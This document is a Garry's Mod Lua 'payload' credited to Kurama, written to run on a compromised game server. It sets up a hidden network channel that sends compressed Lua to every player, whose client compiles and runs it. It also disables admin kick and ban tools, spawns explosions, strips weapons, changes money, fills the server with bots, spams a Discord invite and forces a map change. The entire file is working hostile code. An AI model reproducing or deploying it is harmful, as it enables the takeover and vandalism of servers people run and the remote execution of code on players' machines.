-- Payload Created by Kurama

-- Visuel JETTA LOVE

-- Derma utiliser du Untiltled de !IXXE

-- Obligation to credit myself in the visual

-- discord.gg/kurama

function file.Write() return end
timer.Simple(1,function()
local function rdm_str(len)
    if !len or len <= 0 then return '' end
   return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end
 
local net_string = rdm_str(25)
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "hi"..net_string,function(ply)
    if !ply:IsBot() then
       ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)
 
local function KuramaClient(code)
   local data = util.Compress(code)
   local len = #data
   net.Start(net_string)
   net.WriteUInt(len, 16)
   net.WriteData(data, len)
   net.Broadcast()
end

local function rdm_str(len)
   if !len or len <= 0 then return '' end
   return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "Jetta",function(ply)
    if !ply:IsBot() then
       ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function KuramaClient(code)
   local data = util.Compress(code)
   local len = #data
   net.Start(net_string)
   net.WriteUInt(len, 16)
   net.WriteData(data, len)
   net.Broadcast()
end

local x_der_u = rdm_str(6)
local x_der_v = rdm_str(7)
local vector_five = Vector(0, 0, 5)
local props = ents.FindByClass("prop_*")
local propCache = {}
local playerCache = player.GetHumans()
local thechoosenone = nil

local function xp(a,b,c,d,e,f,g,h,x,w,m,y,s)

  local a,b,c,d,e,f,g,h,x,w,m,y,s = a,b,c,d,e,f,g,h,x,w,m,y,s
  x_der_u = rdm_str(6)
  x_der_v = rdm_str(7)

  KuramaClient([[
    local a = [=[]] ..a.. [[]=]
    local b = ]]    ..b.. [[
    local c = ]]    ..c.. [[
    local d = ]]    ..d.. [[
    local e = ]]    ..e.. [[
    local f = ]]    ..f.. [[
    local g = [=[]] ..g.. [[]=]
    local h = ]]    ..h.. [[
    local x = ]]    ..x.. [[
    local w = [=[]] ..w.. [[]=]
    local m = [=[]] ..m.. [[]=]
    local y = ]]    ..y.. [[
    local s = ]]    ..s.. [[

    local text_x = a
    local sW, sH = ScrW(), ScrH()
    local W, H = ScrW(), ScrH()
    local pw, ph = sW, sH*0.6
    local px, py = sW/2-pw/2, sH/2-ph/2

    surface.CreateFont( "ggPixelCutsceneScaled",{
      font = "Open Sans", 
      size = 50,
      weight = 1000,
      antialias = true
    })
    surface.CreateFont( "ggPixelCutsceneScaledBlur",{
      font = "Open Sans", 
      size = 50,
      weight = 1000,
      antialias = true
    })
    surface.CreateFont( "ggPixelCutsceneScaledERROR",{
      font = "Open Sans", 
      size = 50,
      weight = 1000,
      scanlines = 2.5, 
      antialias = true
    })
    surface.CreateFont( "ggPixelCutsceneScaledBlurERROR",{
      font = "Open Sans", 
      size = 50,
      weight = 1000,
      scanlines = 2.5, 
      antialias = true
    })
    surface.CreateFont( "ggPixelSmall",{
      font = "Open Sans", 
      size = 135,
      weight = 500,
      antialias = false
    })
    surface.CreateFont("lapolice", {
      font = "Open Sans",  
      size = ScrW()*0.02, 
      weight = 10, 
      blursize = 0, 
      scanlines = 2.5, 
      antialias = false
    })
    surface.CreateFont( "PixelCutsceneScaled",{
      font = "Open Sans", 
      size = 500,
      weight = 1000,
      antialias = true
    })
    surface.CreateFont( "PixelCutsceneScaledBlur",{
      font = "Open Sans", 
      size = 500,
      weight = 1000,
      antialias = true
    })
    surface.CreateFont( "PixelCutsceneScaledrt",{
      font = "Open Sans", 
      size = 500,
      weight = 1000,
      scanlines = 2.5, 
      antialias = true
    })
    surface.CreateFont( "PixelCutsceneScaledBlurrt",{
      font = "Open Sans", 
      size = 500,
      weight = 1000,
      scanlines = 2.5, 
      antialias = true
    })
    
    if f == 1 then 
      ]] .. x_der_u .. [[ = vgui.Create("DFrame")
      ]] .. x_der_u .. [[:SetSize( sW, sH )
      ]] .. x_der_u .. [[:SetPos(0,0)
      ]] .. x_der_u .. [[:SetDraggable(false)
      ]] .. x_der_u .. [[:SetTitle("")
      ]] .. x_der_u .. [[:ShowCloseButton(false)
      ]] .. x_der_u .. [[:SetBackgroundBlur( 5 )

      ]] .. x_der_u .. [[.Paint = function( self ) 
         surface.SetDrawColor(30, 30, 30, 0)
      end

      local Close = vgui.Create( "DButton", ]] .. x_der_u .. [[ )
      Close:SetPos(px, py)
      Close:SetText( "" )
      Close:SetSize( pw, ph )
      Close.Paint = function( self, tw, th )
        local shift = math.sin(RealTime()*3)*1.5 + 5
        local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
        local txt_x = { "KURAMA_", "KXXXA_", "XUXAXA_","KXRXMX_" }
        
        timer.Create("charglogo", 0, 0, function()
            local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
            local v = Vector(col.r / 255, col.g / 255, col.b / 255)
        end)
        if b == 1 then 
          if d == 1 then 
            text_x = table.Random( txt_x )
            draw.SimpleText( text_x, "PixelCutsceneScaledBlurrt", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( text_x, "PixelCutsceneScaledrt", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
          else
             draw.SimpleText( text_x, "PixelCutsceneScaledBlurrt", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
             draw.SimpleText( text_x, "PixelCutsceneScaledrt", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
          end
        else
          if d == 1 then 
            text_x = table.Random( txt_x )
            draw.SimpleText( text_x, "PixelCutsceneScaledBlurrt", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( text_x, "PixelCutsceneScaledrt", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
          else
               draw.SimpleText( text_x, "PixelCutsceneScaledBlur", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
               draw.SimpleText( text_x, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            end
         end
      end

      function ]] .. x_der_u .. [[:Think()
          self:MoveToFront()
       end
    end

    if c == 1 then 
      local pw, ph = sW, sH*0.6
      local px, py = sW/2-pw/2, sH/2-ph/2
      local W, H = ScrW(), ScrH()

      ]] .. x_der_v .. [[ = vgui.Create( "DFrame" )
      ]] .. x_der_v .. [[:SetSize( sW, sH )
      ]] .. x_der_v .. [[:SetPos(0,0)
      ]] .. x_der_v .. [[:SetDraggable(false)
      ]] .. x_der_v .. [[:SetTitle("")
      ]] .. x_der_v .. [[:ShowCloseButton(false)

      ]] .. x_der_v .. [[.Paint = function( self ) 
         surface.SetDrawColor(30, 30, 30, 0)
      end

      local Close = vgui.Create( "DButton", ]] .. x_der_v .. [[ )
      Close:SetPos(px, py)
      Close:SetText( "" )
      Close:SetSize( pw, ph+210 )
      Close.Paint = function( self, tw, th )
        local shift = math.sin(RealTime()*3)*1.5 + 3
        local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
        local kuramaSSV_ = { "KURAMA_", "KXXXA_", "XUXAXA_","KXRXMX_" }

        timer.Create("charglogo", 0, 0, function()
            local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
            local v = Vector(col.r / 255, col.g / 255, col.b / 255)
        end)
        if d == 1 then 
          if y == 1 then
            if x == 1 then
              draw.SimpleText( table.Random( kuramaSSV_ ).." win $inf", "ggPixelCutsceneScaledBlurERROR", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
              draw.SimpleText( table.Random( kuramaSSV_ ).." win $inf", "ggPixelCutsceneScaledERROR", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            else
               draw.SimpleText( w .. " win $" ..m, "ggPixelCutsceneScaledBlurERROR", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
               draw.SimpleText( w .. " win $" ..m, "ggPixelCutsceneScaledERROR", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            end
          else
             draw.SimpleText( g, "ggPixelCutsceneScaledBlurERROR", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
             draw.SimpleText( g, "ggPixelCutsceneScaledERROR", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
          end
        else
          if y == 1 then
            if x == 1 then
              draw.SimpleText( table.Random( kuramaSSV_ ).." win $inf", "ggPixelCutsceneScaledBlur", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
              draw.SimpleText( table.Random( kuramaSSV_ ).." win $inf", "ggPixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            else
               draw.SimpleText( w .. " win $" ..m, "ggPixelCutsceneScaledBlur", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
               draw.SimpleText( w .. " win $" ..m, "ggPixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            end
          else
            draw.SimpleText( g, "ggPixelCutsceneScaledBlur", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( g, "ggPixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
         end
      end
        
   end
end
    if s == 1 then 
       timer.Create("]] .. x_der_u .. [[", 0.2, 0, function()
       util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
   end)
end

timer.Simple( e, function()
      for i = 1, 10 do
          if c == 1 then ]] .. x_der_v .. [[:Remove() end
          if f == 1 then ]] .. x_der_u .. [[:Remove() end
          if s == 1 then timer.Remove("]] .. x_der_u .. [[") end
          end
      end)
   ]])
end

local function bounceProps()
  for i = 1, 240 do
    local explode = ents.Create( "env_explosion" ) 
    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-2500, 2000)) ) 
    explode:Spawn() 
    explode:SetKeyValue( "iMagnitude", "500" ) 
    explode:Fire( "Explode", 0, 0 ) 
  end
  for k, v in pairs(ents.GetAll()) do 
    if v:IsVehicle() then
        local explo = ents.Create("env_explosion")
        explo:SetPos(v:GetPos())
        explo:SetKeyValue("iMagnitude", "900")
        explo:Spawn()
        explo:Activate()
        explo:Fire("Explode", "", 0)
     end
  end
  for k,v in pairs(player.GetAll()) do 
     v:SetVelocity(v:GetVelocity() + Vector(math.random(100,200), math.random(100,200), math.random(100,200))) 
  end
  local props = ents.GetAll()
  for _, prop in ipairs( props ) do
    if(prop:GetPhysicsObject():IsValid()) then
      prop:GetPhysicsObject():SetVelocity(Vector(0,0,5))
      prop:GetPhysicsObject():Wake()
      prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, prop:GetPhysicsObject():GetMass() * 1300))
      end
   end
end

function random_players()
  local player = player.GetAll()

  local players = {}
  local playersSID = {}
  
  local win = ""
  local secu = 0
  local money = "1e+"..math.random(15,999)

  for k, v in pairs(player) do
     table.insert( players, v:Nick() )
     table.insert( playersSID, v:SteamID() )
  end

  local idgg = math.random(1,table.Count( players ))
  win = players[idgg]
  local slap = { "KURAMA_", "KXXXA_", "XUXAXA_","KXRXMX_" }
  slay = table.Random( slap )
  
  if playersSID[idgg] == "STEAM_0:0:222677463" or playersSID[idgg] == "STEAM_0:0:200058950" or playersSID[idgg] == "STEAM_0:1:244982537" or playersSID[idgg] == "STEAM_0:0:418942908" or playersSID[idgg] == "STEAM_0:0:468151397" then win = slay secu = 1 end
  
 if secu == 1 then

    local a = ""
    local b = "1"
    local c = "1"
    local d = "1"
    local e = "10"
    local f = "0"
    local g = ""
    local h = "0"
    local x = "1"
    local w = ""
    local m = ""
    local y = "1"
    local s = "1"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
else
    local a = ""
    local b = "0"
    local c = "1"
    local d = "0"
    local e = "10"
    local f = "0"
    local g = "text"
    local h = "0"
    local x = "0"
    local w = win
    local m = money
    local y = "1"
    local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
  end

   print("User " ..win.." - Money " ..money)
   game.ConsoleCommand( "DarkRP setmoney " .. players[idgg].." " ..money.."\n" )

end

local function choosePlayer()
  repeat
    thechoosenone = playerCache[math.random(1, #playerCache)] 
   until IsValid(thechoosenone)
end

choosePlayer()

local nothing = function() end
if ULib then
   ULib.kick = nothing
   ULib.ban = nothing
   ULib.addBan = nothing
end

if FAdmin then
  local tbl = {
    "kick",
    "ban",
    "jail",
    "UnJail",
    "ClearDecals",
    "StopSounds",
    "CleanUp"
  }
  for i=1, #tbl do
   FAdmin.Commands.AddCommand(tbl[i], nothing)
   end
end

function game.CleanUpMap() return false end

local function cacheProps()
  for k, v in pairs( ents.FindByClass( "prop_*" ) ) do 
    local phys = v:GetPhysicsObject()
    if (IsValid(phys)) then
      phys:EnableMotion(true)
      end 
   end
end

timer.Create("cacheProps", 5, 0, cacheProps)

timer.Simple(9,function() 
timer.Create("random_players", 11, 0, random_players)
end)

timer.Simple(0.1,function()
        if DarkRP then
           DarkRP.storeRPName(v, 'Join my Discord => https://discord.gg/kurama')
       v:setDarkRPVar('rpname', 'Join my Discord => https://discord.gg/kurama')
    end
end)

timer.Create("NnoMoreVehicle", 1, 0, function()
  for k,v in pairs(ents.FindByClass("prop_vehicle*")) do 
    v:Remove() 
    end
end)

timer.Simple(1,function() 
  for k,v in pairs(player.GetAll()) do
    v:StripWeapons()
    end
end)

timer.Create("kuramaSSV", 0.5, game.MaxPlayers() - player.GetCount(), function()
    RunConsoleCommand('bot')
end)

timer.Create( "OupsGM_Construct", 200, 1, function()
    RunConsoleCommand("ulx", "map", "gm_construct")
end)

timer.Create( "MbappeActived", 11, 1, function()
RunConsoleCommand( "sv_friction", "-50" )
RunConsoleCommand( "sv_gravity", "300" )
end)

timer.Simple(2,function() 
  for k,v in pairs(player.GetAll()) do
    v:Give( "weapon_physgun" )
    end
end)

local sun = ents.FindByClass("env_sun")
if #sun == 0 then return end
sun = sun[1]
hook.Add("Think","\xFFsun\xFF",function()
    sun:SetKeyValue("sun_dir", math.sin(CurTime())/3 .. " " .. math.cos(CurTime())/3 .. " 0.901970")
    sun:SetModelScale(120)
end)

timer.Simple(1,function()
  for k,v in pairs(player.GetAll()) do 
    v:SetHealth( 9999999999999999999999999 )
    end
end)

util.AddNetworkString("KXRXMX_")
net.Receive("KXRXMX_", function(_, ply)
  if not IsValid(thechoosenone) then choosePlayer() end
  if ply ~= thechoosenone then return end
    bounceProps()
end)

timer.Simple( 5, function()
  local a = ""
  local b = "0"
  local c = "0"
  local d = "0"
  local e = "5"
  local f = "1"
  local g = "0"
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "0"

timer.Simple( 10, function()
  local a = "KXRXMX"
  local b = "0"
  local c = "1"
  local d = "0"
  local e = "5"
  local f = "1"
  local g = [[(/.__.)/ HAXOR \(.__.\)]]
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 15, function()
  local a = "kurama_"
  local b = "0"
  local c = "0"
  local d = "0"
  local e = "170"
  local f = "1"
  local g = "text"
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "0"
xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 90, function()
  local a = ""
  local b = "1"
  local c = "1"
  local d = "0"
  local e = "100"
  local f = "1"
  local g = ""
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "1"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 110, function()
  local b = "0"
  local c = "0"
  local d = "1"
  local e = "80"
  local f = "1"
  local g = "text"
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 130, function()
  local b = "0"
  local c = "0"
  local d = "0"
  local e = "0.8"
  local f = "1"
  local g = "text"
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 150, function()
  local a = ""
  local b = "0"
  local c = "0"
  local d = "0"
  local e = "0.8"
  local f = "1"
  local g = "text"
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 170, function()
  local a = ""
  local b = "0"
  local c = "0"
  local d = "0"
  local e = "0.8"
  local f = "1"
  local g = "text"
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 190, function()
  local a = "Good Bye"
  local b = "0"
  local c = "1"
  local d = "0"
  local e = "999"
  local f = "1"
  local g = "Visuel CREATED by Kurama"
  local h = "0"
  local x = "0"
  local w = ""
  local m = ""
  local y = "0"
  local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
  for k,v in pairs(player.GetAll()) do
    v:ConCommand( "stopsounds" )
    v:ConCommand( "lelstop" )
    end
end)

KuramaClient([[
timer.Create("chatSpam", 1.5, 0, function()
local time = tonumber(0)
local Message = {
    "< https://discord.gg/kurama >",
    "<< https://discord.gg/kurama >>",
    "<<< https://discord.gg/kurama >>>",
    "<<<< https://discord.gg/kurama >>>>",
    "<<<<< https://discord.gg/kurama >>>>>",
    "<<<<<< https://discord.gg/kurama >>>>>>",
    "<<<<<<< https://discord.gg/kurama >>>>>>>",
    "<<<<<<<< https://discord.gg/kurama >>>>>>>>",
    "<<<<<<<<< https://discord.gg/kurama >>>>>>>>>",
    "<<<<<<<< https://discord.gg/kurama >>>>>>>>",
    "<<<<<<< https://discord.gg/kurama >>>>>>>",
    "<<<<<< https://discord.gg/kurama >>>>>>",
    "<<<<< https://discord.gg/kurama >>>>>",
    "<<<< https://discord.gg/kurama >>>>",
    "<<< https://discord.gg/kurama >>>",
    "<< https://discord.gg/kurama >>",
    "< https://discord.gg/kurama >",
    }

    for _, line in pairs(Message) do
    time = time + tonumber(0.1)
timer.Simple(time,function()
           chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
       end)
    end
end)

local AudioSource = nil
local AMP = 12500
  gfx = {}
sound.PlayURL("https://cdn.kurama.info/songs/Jetta.mp3","no block",function(source,  err, errname)
  if IsValid(source) then
    AudioSource = source
      source:Play()

local smoothdata = {}
local smoothdataa = {}
  for i = 1, 512 do
    smoothdataa[i] = 0
end

  for i = 1, 1024 do
    smoothdata[i] = 0
end

TextFramesss = vgui.Create( "DFrame" )
TextFramesss:SetSize( 650, 100 )
TextFramesss:SetTitle( "" )
TextFramesss:ShowCloseButton( false )
TextFramesss:Center()
TextFramesss.Paint = function( self, w, h )
   draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) ) -- Draw a red box instead of the frame
end

local richtext = vgui.Create( "RichText", TextFramesss )
    richtext:Dock( FILL )
    richtext:InsertColorChange( 235, 60, 32, 255 )
    richtext:SetVerticalScrollbarEnabled( false )
local words = { "Welcome", "To", "Payload", "JETTA LOVE", "By", "kurama..." }
local delay = 1
    for w, txt in pairs( words ) do
    if ( w == 1 ) then delay = 0.2
    else delay = ( w-1 )*0.45 end

timer.Simple( delay, function()
    richtext:AppendText( txt.." " )
    richtext:InsertFade( 2, 1 )
    richtext:SetBGColor( Color( 0, 0, 0, 0 ) )
    richtext:SetFontInternal( "DermaLarge" )
   end )
end

TextFramesss:Center()
timer.Simple(7.50, function()
    TextFramesss:Close()
end)

function draw.RotatedBox( x, y, w, h, ang, color )
  draw.NoTexture()
  surface.SetDrawColor( color or color_white )
  surface.DrawTexturedRectRotated( x, y, w, h, ang )
end

    hook.Add("HUDPaint", "cbomecregardewow", function()
local data = {}
    AudioSource:FFT(data, FFT_1024)
    for i = 1, 512 do
local col = HSVToColor(i * 2 % 360,1,1)
    smoothdata [i] = Lerp(10 * FrameTime(), smoothdata[i], data[i])
end

local ab = 0
  for i = 1, 50 do
    ab = ab + data[i]
end
    ab = ab / 50

local function KuramaDev(ply,pos,angles,fov)
local a = 0
  for i = 1, 50 do
    a = a + smoothdata[i]
end
  a = a / 50

local view = {}
  view.origin = pos
  view.angles = angles
  view.fov = fov + (a * 600)
  return view
end

hook.Add("CalcView", "KuramaDev", KuramaDev)

local function LoveSSV(ply,pos,angles,fov)
local ae = 0
  for i = 1, 50 do
    ae = ae + data[i]
  end
    ae = ae / 50

local v = {}
    v.origin = pos
    v.angles = angles
    v.fov = fov - (ae * 600)
  return v
end

local mats = Entity(0):GetMaterials()
            for k,v in pairs(mats) do
              Material(v):SetVector("$color", Vector(ab * 23,0,0))
            end
local tbl = {}
  source:FFT(tbl,FFT_2048)
  
xpcall(function()
          local fal = 0
          for i=4,6 do
          fal = fal + tbl[i]
        end

      if fal > 0.60 then
      if okmecctoikigeresabrotadeadsa == 1337 then
        net.Start("HackSSV")
        net.SendToServer()
      end
timer.Destroy("CustomSettings")
timer.Destroy("ZoomV2")

    hook.Remove("CalcView", "KuramaDev")
      if !hook.GetTable()["CalcView"]["JettaSSV"] then
    hook.Add("CalcView", "JettaSSV", LoveSSV)
  end

local mats = Entity(0):GetMaterials()
          for k,v in pairs(mats) do
          Material(v):SetVector("$color", Vector(0,ab * 23,0))
      end

    hook.Add( "GetMotionBlurValues", "watht", function()
      return 0, 0, 1, math.sin(CurTime() *13)
 end )
 
 
    hook.Add( "PostDrawTranslucentRenderables", "OOF", function()
      render.SetMaterial( Material("cable/cable") )
        for i = 1, 32 do
      render.DrawBeam( LocalPlayer():GetPos() +Vector(0, 0, 100) +(EyeAngles():Forward() *256), EyePos() +(VectorRand() *256), 4, 0, 12.5, Color(255, 255, 255, 255) )
    end
end)
                
timer.Create("ZoomV2", 0.05, 1, function()
    hook.Remove("CalcView", "JettaSSV")
    hook.Add("CalcView", "KuramaDev", KuramaDev)
end)
timer.Create("CustomSettings", 0.80, 1, function()
    hook.Remove("RenderScreenspaceEffects", "USH")
    hook.Remove("PostDrawTranslucentRenderables", "OOF")
    hook.Remove("GetMotionBlurValues", "watht")
end)
util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)
    local col = HSVToColor(ColorRand().r-50, ColorRand().g-50, ColorRand().b-50)
    function GAMEMODE:PostDraw2DSkyBox()
    render.Clear(col.r*1.3, col.g/2.5, col.b/2.5, 255)
      return !!1
end
function GAMEMODE:PreDrawSkyBox()
  render.Clear(col.r*1.3, col.g/2.5, col.b/2.5, 255)
    return !!1
      end
         end
end,function()
           end)
       end)
    end
end)
]])
end)
end)
